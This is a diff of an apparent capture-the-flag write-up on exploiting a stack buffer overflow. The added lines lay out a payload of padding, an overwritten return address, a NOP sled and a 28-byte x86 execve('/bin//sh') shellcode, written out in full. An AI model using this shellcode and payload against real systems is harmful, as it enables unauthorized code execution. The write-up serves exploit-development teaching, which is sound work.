@@ -119,8 +119,25 @@ The following instructions clean ups 20 bytes the stack, essentially leaves the 
 So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.
 
 #### Overwrite the return address
-Now we just overwrite the exit address with 0xffffce04, which is top of the stack. So our payload will look something like this: 
+So what do we overwrite the return address with? The payload can't be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. Maybe we can do something like this:
 
 ```
-AAAAAAAAAAAAAAAAAAAA\x04\x
+  AAAAA...AAAAAAA        +       shellcode address       +       nop sled  +      shellcode
+────────────────────           ────────────────────
+         ▼                              ▼
+  20 As of padding                4bytes overflowing ret
+```
+
+Just search for shellcode on Google and get the 28 bytes one.
+```
+\x31\xc0\x50\x68\x2f\x2f\x73
+\x68\x68\x2f\x62\x69\x6e\x89
+\xe3\x89\xc1\x89\xc2\xb0\x0b
+\xcd\x80\x31\xc0\x40\xcd\x80
+```
+
+Now we try to locate the address of the nop sled. 
+
+```
+AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 ```
